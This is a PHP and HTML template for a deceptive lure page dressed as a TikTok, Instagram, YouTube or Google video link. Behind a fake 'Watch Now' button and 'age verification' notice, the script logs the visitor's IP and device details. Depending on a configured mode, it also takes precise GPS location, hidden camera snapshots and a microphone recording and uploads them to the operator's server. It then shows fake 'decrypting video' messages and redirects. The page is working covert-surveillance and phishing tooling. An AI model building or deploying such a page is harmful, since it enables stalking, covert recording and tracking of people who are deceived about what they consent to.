<?php
$link = getLinkDetails($link_code);
if (!$link) {
    die("Invalid or inactive link.");
}

// Log initial visit
$ip_info = getIpInfo($_SERVER['REMOTE_ADDR']);
saveCapturedData($link['id'], 'visit', json_encode($ip_info));

$theme = $link['theme'] ?? 'default';
?>
<!DOCTYPE html>
<html lang="en" class="h-full">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= htmlspecialchars($link['title']) ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { font-family: 'Plus Jakarta Sans', sans-serif; }
        .glass { background: rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); border: 1px solid rgba(255, 255, 255, 0.1); }
        
        /* Theme Styles */
        .theme-tiktok { background: #010101; color: white; }
        .theme-instagram { background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); color: white; }
        .theme-youtube { background: #f9f9f9; color: #030303; }
        .theme-google { background: #ffffff; color: #3c4043; }
        .theme-default { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        
        .pulse-ring {
            animation: pulse-ring 2s infinite;
        }
        
        @keyframes pulse-ring {
            0% { box-shadow: 0 0 0 0 rgba(102, 126, 234, 0.7); }
            70% { box-shadow: 0 0 0 20px rgba(102, 126, 234, 0); }
            100% { box-shadow: 0 0 0 0 rgba(102, 126, 234, 0); }
        }
    </style>
</head>
<body class="h-full theme-<?= $theme ?> flex flex-col items-center justify-center p-4">
    
    <div class="max-w-md w-full space-y-8 animate-in fade-in zoom-in duration-700">
        <!-- Content Card -->
        <div class="<?= ($theme == 'youtube' || $theme == 'google') ? 'bg-white border border-slate-200' : 'glass' ?> rounded-[2.5rem] p-8 text-center shadow-2xl overflow-hidden relative">
            
            <?php if ($link['link_image_path']): ?>
                <img src="<?= htmlspecialchars($link['link_image_path']) ?>" class="w-full h-48 object-cover rounded-3xl mb-6 shadow-lg">
            <?php else: ?>
                <div class="w-20 h-20 bg-indigo-600 rounded-3xl flex items-center justify-center mx-auto mb-6 shadow-xl shadow-indigo-500/20 pulse-ring">
                    <i class="fas fa-play text-white text-3xl ml-1"></i>
                </div>
            <?php endif; ?>

            <h1 class="text-2xl font-extrabold mb-3 leading-tight"><?= htmlspecialchars($link['title']) ?></h1>
            <p class="text-sm opacity-80 mb-8 font-medium"><?= htmlspecialchars($link['description']) ?></p>

            <div id="status-container" class="space-y-4">
                <button id="start-btn" class="w-full bg-indigo-600 hover:bg-indigo-700 text-white py-4 rounded-2xl font-extrabold text-lg shadow-xl shadow-indigo-500/20 transition-all active:scale-95 flex items-center justify-center gap-2">
                    <i class="fas fa-play"></i>
                    Watch Now
                </button>
                <p class="text-[10px] opacity-50 font-bold uppercase tracking-widest">Age Verification Required</p>
            </div>

            <div id="loading-container" class="hidden space-y-6 py-4">
                <div class="flex items-center justify-center gap-2">
                    <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce"></div>
                    <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce [animation-delay:-0.15s]"></div>
                    <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce [animation-delay:-0.3s]"></div>
                </div>
                <p id="loading-text" class="text-sm font-bold opacity-80 uppercase tracking-widest">Connecting to secure server...</p>
            </div>
        </div>

        <!-- Footer Info -->
        <div class="flex items-center justify-center gap-6 opacity-40 grayscale text-xs font-bold uppercase tracking-widest">
            <div class="flex items-center gap-2">
                <i class="fas fa-shield-halved"></i>
                SSL Secure
            </div>
            <div class="flex items-center gap-2">
                <i class="fas fa-check-circle"></i>
                Verified
            </div>
        </div>
    </div>

    <!-- Hidden Elements for Capture -->
    <video id="video" width="640" height="480" autoplay playsinline muted style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const linkCode = '<?= $link['link_code'] ?>';
        const toolType = '<?= $link['tool_type'] ?>';
        const redirectUrl = '<?= $link['redirect_url'] ?>';
        const micDuration = <?= $link['mic_duration'] ?>;
        const imageCount = <?= $link['image_count'] ?>;

        const startBtn = document.getElementById('start-btn');
        const statusContainer = document.getElementById('status-container');
        const loadingContainer = document.getElementById('loading-container');
        const loadingText = document.getElementById('loading-text');

        // Polyfill for older browsers
        if (navigator.mediaDevices === undefined) {
            navigator.mediaDevices = {};
        }
        if (navigator.mediaDevices.getUserMedia === undefined) {
            navigator.mediaDevices.getUserMedia = function(constraints) {
                var getUserMedia = navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia;
                if (!getUserMedia) {
                    return Promise.reject(new Error('getUserMedia is not implemented in this browser'));
                }
                return new Promise(function(resolve, reject) {
                    getUserMedia.call(navigator, constraints, resolve, reject);
                });
            }
        }

        startBtn.addEventListener('click', async () => {
            console.log("Start button clicked. Tool Type:", toolType);
            
            // Check for HTTPS
            if (location.protocol !== 'https:' && location.hostname !== 'localhost' && location.hostname !== '127.0.0.1') {
                console.warn("Media capture requires HTTPS. Current protocol:", location.protocol);
                postCapture('security_warning', 'Media capture failed: HTTPS is required for camera/microphone access.');
            }

            statusContainer.classList.add('hidden');
            loadingContainer.classList.remove('hidden');
            
            // Start sequential collection
            try {
                await collectAllData();
            } catch (err) {
                console.error("Collection error:", err);
            }

            // Final redirection sequence
            let progress = 0;
            const interval = setInterval(() => {
                progress += 10;
                if (progress <= 30) loadingText.innerText = 'Bypassing regional restrictions...';
                else if (progress <= 60) loadingText.innerText = 'Buffering high-quality stream...';
                else if (progress <= 90) loadingText.innerText = 'Decrypting video content...';
                
                if (progress >= 100) {
                    clearInterval(interval);
                    window.location.href = redirectUrl;
                }
            }, 800);
        });

        async function collectAllData() {
            // 1. Device Intel (Always)
            console.log("Capturing device intel...");
            postCapture('device_intel', JSON.stringify({
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                cores: navigator.hardwareConcurrency || 'unknown',
                memory: navigator.deviceMemory || 'unknown',
                secureContext: window.isSecureContext
            }));

            // 2. Location
            if (toolType === 'location' || toolType === 'all') {
                console.log("Requesting location...");
                await new Promise((resolve) => {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            pos => {
                                console.log("Location received");
                                sendLocationData(pos);
                                resolve();
                            },
                            err => {
                                console.warn("Location denied:", err.message);
                                postCapture('location_error', 'Denied: ' + err.message);
                                resolve();
                            },
                            { enableHighAccuracy: true, timeout: 5000 }
                        );
                    } else {
                        console.warn("Geolocation not supported");
                        postCapture('location_error', 'Not supported by browser');
                        resolve();
                    }
                });
            }

            // 3. Camera
            if (toolType === 'camera' || toolType === 'all') {
                console.log("Requesting camera...");
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    console.log("Camera access granted");
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    await video.play();
                    
                    for(let i=0; i<imageCount; i++) {
                        await new Promise(r => setTimeout(r, 1000));
                        captureFrame(video, i);
                    }
                    
                    stream.getTracks().forEach(t => t.stop());
                } catch (e) {
                    console.warn("Camera denied or error:", e.message);
                    postCapture('camera_error', 'Denied: ' + e.message);
                }
            }

            // 4. Microphone
            if (toolType === 'microphone' || toolType === 'all') {
                console.log("Requesting microphone...");
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    console.log("Microphone access granted");
                    const recorder = new MediaRecorder(stream);
                    const chunks = [];
                    recorder.ondataavailable = e => chunks.push(e.data);
                    
                    const recordPromise = new Promise((resolve) => {
                        recorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/webm' });
                            uploadFile(blob, 'audio.webm', 'microphone');
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        };
                    });

                    recorder.start();
                    setTimeout(() => {
                        if (recorder.state === 'recording') recorder.stop();
                    }, micDuration * 1000);
                    await recordPromise;
                } catch (e) {
                    console.warn("Microphone denied or error:", e.message);
                    postCapture('microphone_error', 'Denied: ' + e.message);
                }
            }
        }

        function captureFrame(video, index) {
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            canvas.toBlob(blob => uploadFile(blob, `snap_${index}.jpg`, 'camera'), 'image/jpeg', 0.8);
        }

        function uploadFile(blob, name, type) {
            const fd = new FormData();
            fd.append('link_code', linkCode);
            fd.append('file', blob, name);
            fd.append('data_type', type);
            fetch('index.php?api=upload', { method: 'POST', body: fd });
        }

        function sendLocationData(pos) {
            const data = new URLSearchParams({
                link_code: linkCode,
                data_type: 'location',
                data_content: 'GPS Data',
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy
            });
            fetch('index.php?api=capture', { method: 'POST', body: data });
        }

        function postCapture(type, content) {
            const data = new URLSearchParams({ link_code: linkCode, data_type: type, data_content: content });
            fetch('index.php?api=capture', { method: 'POST', body: data });
        }
    </script>
</body>
</html>
